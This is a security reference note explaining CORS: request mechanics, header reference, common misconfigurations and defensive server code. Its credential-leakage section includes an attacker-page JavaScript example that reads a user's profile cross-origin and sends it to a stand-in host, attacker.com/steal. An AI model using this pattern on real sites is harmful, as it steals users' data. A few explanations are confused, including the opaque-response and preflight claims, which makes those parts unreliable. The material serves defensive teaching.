# Security — CORS (Cross-Origin Resource Sharing): Headers, Misconfigurations & Defense

## Overview

CORS (Cross-Origin Resource Sharing) is the browser mechanism that allows controlled cross-origin requests, extending the same-origin policy. Misunderstanding CORS leads to common security vulnerabilities: overly permissive `Access-Control-Allow-Origin` headers, wildcard abuse, credential exposure, and confusion between CORS and actual authentication. This note covers CORS architecture, request mechanics, attack vectors, and defensive patterns.

---

## Same-Origin Policy Foundation

The **same-origin policy (SOP)** isolates documents fetched from different origins. Two URLs are same-origin if they share the same protocol, domain, and port:
- `https://example.com:443` and `https://example.com/api` → same-origin
- `https://example.com` and `http://example.com` → different (protocol mismatch)
- `https://example.com` and `https://example.com:8080` → different (port mismatch)
- `https://example.com` and `https://sub.example.com` → different (domain mismatch)

SOP prevents malicious scripts on `evil.com` from reading responses from `bank.com`'s API. However, SOP is **only enforced by the browser on client-side requests**. It does not apply to:
- Server-to-server HTTP requests
- Form submissions (historical exception)
- Script tags, images, stylesheets (intentionally allow cross-origin loads)

CORS is the standard mechanism to **safely relax SOP for specific, authenticated cross-origin requests**.

---

## CORS Request Mechanics: Simple vs. Preflighted

### Simple Requests

A **simple request** is automatically allowed by the browser without a preflight check if it meets all conditions:
- **Method**: GET, HEAD, or POST
- **Headers**: Only `Accept`, `Accept-Language`, `Content-Language`, `Content-Type` (with specific MIME types), or `Range`
- **Content-Type (if POST)**: `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`

Simple requests are sent directly; the browser adds `Origin` header and checks the response for `Access-Control-Allow-Origin`.

```
GET /api/data HTTP/1.1
Host: api.example.com
Origin: https://client.example.com
```

Response:
```
Access-Control-Allow-Origin: https://client.example.com
Access-Control-Allow-Credentials: true
```

### Preflighted Requests

Any request that doesn't meet simple request criteria triggers a **preflight**: the browser automatically sends an `OPTIONS` request first. Only if the preflight succeeds does it send the actual request.

Preflight is triggered by:
- **Methods**: PUT, DELETE, PATCH, CONNECT, TRACE
- **Custom headers**: Any header outside the simple set (`Authorization`, `X-Custom-Header`, etc.)
- **Content-Type**: `application/json`, `application/xml`, custom types

Preflight request:
```
OPTIONS /api/users HTTP/1.1
Host: api.example.com
Origin: https://client.example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization
```

Server response must approve:
```
Access-Control-Allow-Origin: https://client.example.com
Access-Control-Allow-Methods: POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400
```

The `Access-Control-Max-Age` header tells the browser to cache the preflight response for 86400 seconds, reducing preflight overhead.

---

## Access-Control Headers: Reference

| Header | Purpose | Example |
|--------|---------|---------|
| `Access-Control-Allow-Origin` | Which origins can access the resource | `https://client.example.com` or `*` |
| `Access-Control-Allow-Methods` | Allowed HTTP methods | `GET, POST, PUT, DELETE` |
| `Access-Control-Allow-Headers` | Allowed request headers | `Content-Type, Authorization` |
| `Access-Control-Expose-Headers` | Headers the browser exposes to JavaScript | `X-Total-Count, X-Page-Number` |
| `Access-Control-Allow-Credentials` | Whether cookies/auth are included | `true` or omitted |
| `Access-Control-Max-Age` | Preflight cache duration (seconds) | `86400` |

---

## CORS Misconfigurations & Attacks

### Wildcard Allow-Origin

```
Access-Control-Allow-Origin: *
```

This permits **any origin** to access the resource. Combined with credentials, it is catastrophic:

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

This configuration is **logically invalid**. The wildcard `*` means "any origin," but `Credentials: true` requires a specific origin (credentials are sensitive and must be targeted). Most browsers ignore `Credentials: true` when `Allow-Origin: *` is set, but confusion and misimplementation are common.

**Risk**: Sensitive data (user profile, API keys, account info) exposed to any website that makes a request.

### Dynamic Origin Reflection

Insecure servers sometimes echo the `Origin` header back:

```javascript
// Insecure
Access-Control-Allow-Origin: ${request.headers['Origin']}
```

Any origin can then access protected resources. An attacker controls the Origin header and the server accepts it.

```javascript
// Secure alternative
const allowedOrigins = ['https://trusted1.com', 'https://trusted2.com'];
if (allowedOrigins.includes(request.headers['Origin'])) {
  res.set('Access-Control-Allow-Origin', request.headers['Origin']);
}
```

### Credential Leakage with CORS

When `Access-Control-Allow-Credentials: true`, the browser automatically includes cookies and HTTP auth credentials in cross-origin requests **if the JavaScript explicitly requests them**:

```javascript
fetch('https://api.example.com/user', {
  method: 'GET',
  credentials: 'include'  // Include cookies
})
```

If the API returns sensitive data and allows credentials from a misconfigured origin, the attacker's page can read that data.

```javascript
// Attacker page (evil.com)
fetch('https://api.example.com/user', {
  method: 'GET',
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  // Exfiltrates user's profile (name, email, etc.)
  fetch('https://attacker.com/steal?data=' + JSON.stringify(data));
});
```

---

## Opaque Responses & CORS Opacity

When a request violates CORS policy, the browser returns an **opaque response**: JavaScript cannot read the response body, headers, or status code. This is intentional—it prevents scripts from probing whether a resource exists or extracting data from failed requests.

```javascript
fetch('https://different-domain.com/api')
  .then(r => r.json())  // TypeError: opaque response
```

Opaque responses have:
- No readable `status` or `statusText`
- No readable headers (except empty `Access-Control-Expose-Headers`)
- No readable body

This limits information disclosure without removing cross-origin navigation capabilities. Form submissions and redirects still work (navigational requests bypass CORS).

---

## CSP and CORS Interaction

**Content Security Policy (CSP)** is a separate but related defense that restricts where scripts and resources can be loaded from. CSP acts on the **origin level**, while CORS acts on the **header level**.

CSP directive:
```
script-src 'self' https://trusted.com
```

This prevents inline scripts and scripts from domains other than `https://trusted.com`. Even if CORS allows it, CSP blocks the script load.

CORS and CSP are **complementary**: CORS controls cross-origin **HTTP requests**, while CSP restricts **resource loading and script execution**. Both must be configured correctly.

---

## Common Misunderstandings

### CORS is Not Authentication
CORS does not authenticate the client. It only controls whether the browser allows a request to proceed. A misconfigured CORS header leaks data to any website that makes a request. Use authentication tokens (OAuth, JWT, mTLS) in addition to CORS restrictions.

### Preflight Requests Cannot Be Bypassed
Some believe preflight can be avoided by using only simple requests. However:
- Preflight is automatic if the request doesn't meet simple criteria
- Custom headers (`Authorization`) trigger preflight
- Attackers cannot bypass preflight; legitimate clients also incur the preflight cost

### Server Receives the Request Even if CORS Fails
The browser sends the actual request to the server **after the preflight succeeds**. If the preflight fails, the actual request is never sent. However, if the server ignores CORS headers, the server still processes the request—CORS is a **browser-side policy**, not a server guarantee.

---

## Defensive Patterns

### Whitelist Origins Explicitly

```javascript
const ALLOWED_ORIGINS = [
  'https://app.example.com',
  'https://admin.example.com',
  'https://trusted-partner.com'
];

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (ALLOWED_ORIGINS.includes(origin)) {
    res.set('Access-Control-Allow-Origin', origin);
  }
  next();
});
```

Never use `*` for APIs that return sensitive data or require authentication.

### Combine with Authentication

CORS alone does not protect data. Always require authentication tokens:

```javascript
// Preflight succeeds, but actual request fails without valid Authorization
res.set('Access-Control-Allow-Headers', 'Content-Type, Authorization');

app.get('/api/user', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!validateToken(token)) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  res.json({ /* user data */ });
});
```

### Use Expose-Headers for Pagination Metadata

If the client needs custom headers (pagination info, rate limits), explicitly expose them:

```javascript
res.set('Access-Control-Expose-Headers', 'X-Total-Count, X-Page-Number, X-RateLimit-Remaining');
res.set('X-Total-Count', '1000');
```

Without `Expose-Headers`, these custom headers are silently hidden from JavaScript.

### Avoid Wildcard Methods and Headers

Instead of `Access-Control-Allow-Methods: *`, specify:

```javascript
res.set('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
```

### Set Credentials Carefully

Only allow credentials when necessary:

```javascript
// Only if the API uses cookie-based sessions
res.set('Access-Control-Allow-Credentials', 'true');
```

If credentials are allowed, `Access-Control-Allow-Origin` must be a specific origin, not `*`.

---

## See Also

- security-web-application (session security, cookie flags)
- web-browser-security (CSP, XSS prevention)
- security-secure-coding (input validation, output encoding)
- api-rest-maturity.md (API design principles)